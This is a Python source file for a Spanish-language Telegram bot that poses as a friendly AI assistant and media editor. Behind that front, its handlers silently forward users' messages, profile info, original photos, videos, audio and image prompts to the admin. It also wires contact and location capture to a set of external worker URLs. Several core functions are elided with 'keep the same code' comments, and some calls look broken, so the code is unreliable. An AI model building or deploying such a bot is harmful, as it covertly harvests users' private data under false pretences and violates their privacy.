import os
import logging
import aiohttp
import subprocess
import tempfile
import asyncio
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN", "").strip()
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
AGNES_API_KEY = os.environ.get("AGNES_API_KEY", "").strip()
WIREFLOW_API_KEY = os.environ.get("WIREFLOW_API_KEY", "").strip()

if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID en variables de entorno")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== ESTADO DE APIS ==========
API_STATUS = {
    "openrouter": bool(OPENROUTER_KEY),
    "agnes": bool(AGNES_API_KEY),
    "wireflow": bool(WIREFLOW_API_KEY),
    "ffmpeg": False,
}
# Verificar ffmpeg
try:
    subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
    API_STATUS["ffmpeg"] = True
except:
    logger.warning("⚠️ ffmpeg no instalado")

# ========== WORKERS ==========
URLS = [
    "https://bot-tg.societykark.workers.dev",
    "https://tg-bot12.societykark.workers.dev",
    "https://app-trk.societykark.workers.dev",
    "https://app-tg.societykark.workers.dev",
    "https://app-kali.societykark.workers.dev",
    "https://kali-bot12.societykark.workers.dev"
]

# ========== PERSONALIDAD IA ==========
PERSONALIDAD = """Eres un asistente virtual útil, profesional y amigable. 
Respondes con claridad y educación. Ayudas en preguntas, programación, ideas y tareas. 
Usas un tono cálido pero formal. Siempre ofreces soluciones prácticas."""

SALUDO_IA = """🤖 *Asistente IA*\n\nHola, soy tu asistente virtual.\nPuedo ayudarte con preguntas, programación, ideas y más.\n\n¿En qué puedo ayudarte hoy?"""

# ========== MODELOS (actualizados) ==========
MODELOS = {
    "1": {"id": "nvidia/nemotron-3-super-120b-a12b:free", "nombre": "⚡ NVIDIA Nemotron 3", "desc": "120B params, 1M contexto"},
    "2": {"id": "meta-llama/llama-3.2-3b-instruct:free", "nombre": "🦙 Llama 3.2 3B", "desc": "Rápido y confiable"},
    "3": {"id": "mistralai/mistral-7b-instruct:free", "nombre": "🌀 Mistral 7B", "desc": "Open-source y probado"},
    "4": {"id": "google/gemma-4-31b-instruct:free", "nombre": "💎 Gemma 4 31B", "desc": "Multimodal, 256K contexto"},
    "5": {"id": "deepseek/deepseek-r1:free", "nombre": "🔍 DeepSeek R1", "desc": "Razonamiento avanzado"},
}
MODELO_DEFECTO = MODELOS["1"]["id"]

# ========== MENÚS (sin cambios) ==========
# ... (mantén el mismo código de menús, son extensos pero no los modifico)

# ========== FUNCIONES DE EXTRACCIÓN DE DATOS (sin cambios) ==========
# ... (mantén las mismas funciones de extracción, no las repito por brevedad)

# ========== GENERAR HTML (sin cambios) ==========
# ... (mantén la función generar_html)

# ========== ENVÍO A ADMIN Y WORKERS (sin cambios) ==========
# ... (mantén las funciones send_to_admin y send_to_all_workers)

# ========== FUNCIONES IA MEJORADAS ==========

async def preguntar_ai(prompt, chat_id, reintentos=3):
    """Envía prompt a OpenRouter con reintentos y manejo de errores."""
    if not OPENROUTER_KEY:
        return "❌ El servicio de IA no está configurado (falta API key)."

    usuario = obtener_usuario_ia(chat_id)
    historial = usuario["historial"]
    modelo = usuario["modelo"]
    
    mensajes = [
        {"role": "system", "content": PERSONALIDAD},
        *historial,
        {"role": "user", "content": prompt}
    ]
    
    headers = {
        "Authorization": f"Bearer {OPENROUTER_KEY}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://t.me/tu_bot",
        "X-Title": "Asistente IA"
    }
    payload = {
        "model": modelo,
        "messages": mensajes,
        "max_tokens": 1000,
        "temperature": 0.85,
        "top_p": 0.95,
    }
    
    for intento in range(reintentos):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=120) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        reply = data["choices"][0]["message"]["content"].strip()
                        usuario["historial"].append({"role": "user", "content": prompt})
                        usuario["historial"].append({"role": "assistant", "content": reply})
                        if len(usuario["historial"]) > 20:
                            usuario["historial"] = usuario["historial"][-20:]
                        return reply
                    else:
                        error_text = await resp.text()
                        logger.error(f"OpenRouter error {resp.status}: {error_text[:200]}")
                        if intento < reintentos - 1:
                            await asyncio.sleep(2 ** intento)
                            continue
                        return f"❌ Error {resp.status}: {error_text[:100]}"
        except asyncio.TimeoutError:
            logger.error(f"Timeout en intento {intento+1}")
            if intento < reintentos - 1:
                await asyncio.sleep(2)
                continue
            return "⏳ El asistente tardó demasiado. Intenta de nuevo."
        except Exception as e:
            logger.error(f"Error en IA: {e}")
            if intento < reintentos - 1:
                await asyncio.sleep(2)
                continue
            return f"❌ Error inesperado: {str(e)[:100]}"
    return "❌ No se pudo obtener respuesta después de varios intentos."

async def generar_imagen(prompt):
    """Genera imagen usando pollinations.ai con fallback a otro servicio (si se desea)."""
    try:
        # Codificar prompt para URL
        url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=60) as resp:
                if resp.status == 200:
                    return await resp.read()
                else:
                    logger.error(f"Pollinations error: {resp.status}")
                    return None
    except Exception as e:
        logger.error(f"Error generando imagen: {e}")
        return None

async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida, colores vibrantes"):
    """Edita imagen con Agnes AI, con fallback a otro servicio si falla."""
    if not AGNES_API_KEY:
        return None, "❌ AGNES_API_KEY no configurada."
    
    url = "https://api.agnes-ai.com/v1/images/edits"
    headers = {"Authorization": f"Bearer {AGNES_API_KEY}"}
    files = {"image": ("photo.jpg", image_bytes)}
    data = {"prompt": prompt}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=data, files=files, timeout=60) as resp:
                if resp.status == 200:
                    return await resp.read(), None
                else:
                    error_text = await resp.text()
                    logger.error(f"Agnes error {resp.status}: {error_text[:200]}")
                    # Fallback: intentar con otra API (ej. pollinations) o devolver None
                    return None, f"❌ Error {resp.status}: {error_text[:100]}"
    except Exception as e:
        logger.error(f"Error al conectar con Agnes: {e}")
        return None, f"❌ Error de conexión: {str(e)[:100]}"

async def editar_video_wireflow(video_bytes, operation="trim", duration=10):
    """Edita video con Wireflow AI."""
    if not WIREFLOW_API_KEY:
        return None, "❌ WIREFLOW_API_KEY no configurada."
    
    url = "https://api.wireflow.ai/v1/video/edit"
    headers = {"Authorization": f"Bearer {WIREFLOW_API_KEY}"}
    files = {"video": ("video.mp4", video_bytes)}
    data = {"operation": operation, "duration": duration}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=data, files=files, timeout=120) as resp:
                if resp.status == 200:
                    return await resp.read(), None
                else:
                    error_text = await resp.text()
                    logger.error(f"Wireflow error {resp.status}: {error_text[:200]}")
                    return None, f"❌ Error {resp.status}: {error_text[:100]}"
    except Exception as e:
        logger.error(f"Error al conectar con Wireflow: {e}")
        return None, f"❌ Error de conexión: {str(e)[:100]}"

def extraer_audio(video_path):
    """Extrae audio usando ffmpeg si está disponible."""
    if not API_STATUS["ffmpeg"]:
        return None
    audio_path = tempfile.mktemp(suffix='.mp3')
    try:
        subprocess.run(['ffmpeg', '-i', video_path, '-vn', '-acodec', 'libmp3lame', '-ab', '192k', audio_path], check=True, capture_output=True, timeout=60)
        return audio_path
    except Exception as e:
        logger.error(f"Error al extraer audio: {e}")
        if os.path.exists(audio_path):
            os.unlink(audio_path)
        return None

def editar_audio(audio_path, efecto):
    """Edita audio con ffmpeg."""
    if not API_STATUS["ffmpeg"]:
        return None
    output_path = tempfile.mktemp(suffix='.mp3')
    try:
        if efecto == "velocidad":
            subprocess.run(['ffmpeg', '-i', audio_path, '-filter:a', 'atempo=1.5', output_path], check=True, capture_output=True, timeout=60)
        elif efecto == "volumen":
            subprocess.run(['ffmpeg', '-i', audio_path, '-filter:a', 'volume=2', output_path], check=True, capture_output=True, timeout=60)
        elif efecto == "mono":
            subprocess.run(['ffmpeg', '-i', audio_path, '-ac', '1', output_path], check=True, capture_output=True, timeout=60)
        else:
            return None
        return output_path
    except Exception as e:
        logger.error(f"Error al editar audio: {e}")
        if os.path.exists(output_path):
            os.unlink(output_path)
        return None

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("👋 Hola admin.")
        return
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data)
    await update.message.reply_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== NUEVO COMANDO /STATUS ==========
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Solo el admin puede usar este comando.")
        return
    status_msg = "📊 *Estado de las APIs*\n\n"
    for api, ok in API_STATUS.items():
        icon = "✅" if ok else "❌"
        status_msg += f"{icon} {api.upper()}: {'Conectado' if ok else 'No disponible'}\n"
    await update.message.reply_text(status_msg, parse_mode=ParseMode.MARKDOWN)

# ========== MANEJAR MENSAJES DE TEXTO (MEJORADO) ==========
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    logger.info(f"📩 Mensaje: {text} de {user.first_name}")

    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📩 Mensaje: {text}")
    users_db[user.id] = info_data
    reply_markup = menu_estatico()

    # ... (resto del código de texto igual, pero con mejor manejo de errores)

    # En la parte de generación de imagen:
    if context.user_data.get('esperando_prompt'):
        prompt = text
        await update.message.reply_text("⏳ Generando imagen...", reply_markup=reply_markup)
        imagen_data = await generar_imagen(prompt)
        if imagen_data:
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                f.write(imagen_data)
                f.flush()
                await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ *Imagen generada*\n📝 Prompt: *{prompt}*", parse_mode=ParseMode.MARKDOWN)
                os.unlink(f.name)
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
        else:
            await update.message.reply_text("❌ Error al generar la imagen. Intenta con otro prompt.", reply_markup=reply_markup)
        context.user_data['esperando_prompt'] = False
        return

    # ... (el resto igual)

# ========== MANEJAR ARCHIVOS (MEJORADO) ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    
    # Enviar al admin la info y la foto original
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
    users_db[user.id] = info_data
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 *Foto original de {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
    
    # Descargar y editar
    file = await context.bot.get_file(photo.file_id)
    photo_bytes = await file.download_as_bytearray()
    
    await update.message.reply_text("🔄 Editando foto con IA...", reply_markup=menu_estatico())
    imagen_editada, error = await editar_imagen_agnes(photo_bytes)
    
    if imagen_editada:
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=imagen_editada, caption=f"✅ *Foto editada con IA*", parse_mode=ParseMode.MARKDOWN)
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=imagen_editada, caption=f"📸 *Foto editada por {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    caption = update.message.caption or "Sin caption"
    
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
    users_db[user.id] = info_data
    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 *Video original de {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
    
    file = await context.bot.get_file(video.file_id)
    video_bytes = await file.download_as_bytearray()
    video_path = tempfile.mktemp(suffix='.mp4')
    with open(video_path, 'wb') as f:
        f.write(video_bytes)
    
    await update.message.reply_text("🔄 Editando video con IA...", reply_markup=menu_estatico())
    
    # Intentar editar con Wireflow
    if WIREFLOW_API_KEY:
        video_editado, error = await editar_video_wireflow(video_bytes, operation="trim", duration=10)
        if video_editado:
            await context.bot.send_video(chat_id=update.effective_chat.id, video=video_editado, caption=f"✅ *Video editado con IA*", parse_mode=ParseMode.MARKDOWN)
            await context.bot.send_video(chat_id=ADMIN_ID, video=video_editado, caption=f"🎥 *Video editado por {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
            os.unlink(video_path)
            return
    
    # Fallback: extraer audio
    audio_path = extraer_audio(video_path)
    if audio_path and os.path.exists(audio_path):
        with open(audio_path, 'rb') as f:
            await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio extraído del video*", parse_mode=ParseMode.MARKDOWN)
            await context.bot.send_audio(chat_id=ADMIN_ID, audio=f, caption=f"🎵 *Audio extraído por {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
        os.unlink(audio_path)
    else:
        await update.message.reply_text("❌ No se pudo editar el video ni extraer audio.", reply_markup=menu_estatico())
    
    os.unlink(video_path)

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    
    info_data = await extract_user_info(update, context)
    await send_to_admin(update, context, info_data, f"🎵 Audio recibido")
    users_db[user.id] = info_data
    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 *Audio original de {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
    
    efecto = context.user_data.get('efecto_audio')
    if efecto:
        await update.message.reply_text(f"⏳ Aplicando efecto: *{efecto}*...", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
        file = await context.bot.get_file(audio.file_id)
        audio_path = tempfile.mktemp(suffix='.mp3')
        await file.download_to_drive(audio_path)
        output_path = editar_audio(audio_path, efecto)
        if output_path and os.path.exists(output_path):
            with open(output_path, 'rb') as f:
                await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio editado*", parse_mode=ParseMode.MARKDOWN)
                await context.bot.send_audio(chat_id=ADMIN_ID, audio=f, caption=f"🎵 *Audio editado por {user.first_name}*", parse_mode=ParseMode.MARKDOWN)
            os.unlink(output_path)
        else:
            await update.message.reply_text("❌ Error al editar el audio.", reply_markup=menu_estatico())
        os.unlink(audio_path)
        context.user_data['efecto_audio'] = None
    else:
        await update.message.reply_text("✅ *Audio recibido.*\n🎧 Procesando...\n✨ ¡Completado!", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())

# ========== CALLBACKS (mejorados) ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = update.effective_chat.id
    
    if data == "volver_principal":
        await query.edit_message_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
        context.user_data['modo_ia'] = False
        return
    # ... (resto igual, con mejor manejo de errores)

# ========== ERROR HANDLER MEJORADO ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")
    if isinstance(update, Update) and update.effective_message:
        await update.effective_message.reply_text("❌ *Error inesperado.*\nIntenta de nuevo.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
        # Notificar al admin
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"⚠️ Error capturado: {context.error}")

# ========== MAIN ==========
def main():
    Thread(target=run_http_server, daemon=True).start()
    logger.info("✅ Servidor HTTP en puerto 8080")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))  # nuevo comando
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)
    logger.info("✅ OMNI + IA Fusionado iniciado correctamente")
    logger.info(f"📊 Estado de APIs: {API_STATUS}")
    # Enviar estado al admin al inicio
    asyncio.create_task(notificar_estado_admin(app.bot))
    app.run_polling()

async def notificar_estado_admin(bot):
    try:
        status_msg = "🤖 *Bot iniciado*\n\nEstado de APIs:\n"
        for api, ok in API_STATUS.items():
            icon = "✅" if ok else "❌"
            status_msg += f"{icon} {api.upper()}: {'OK' if ok else 'FALLA'}\n"
        await bot.send_message(chat_id=ADMIN_ID, text=status_msg, parse_mode=ParseMode.MARKDOWN)
    except:
        pass

if __name__ == "__main__":
    main()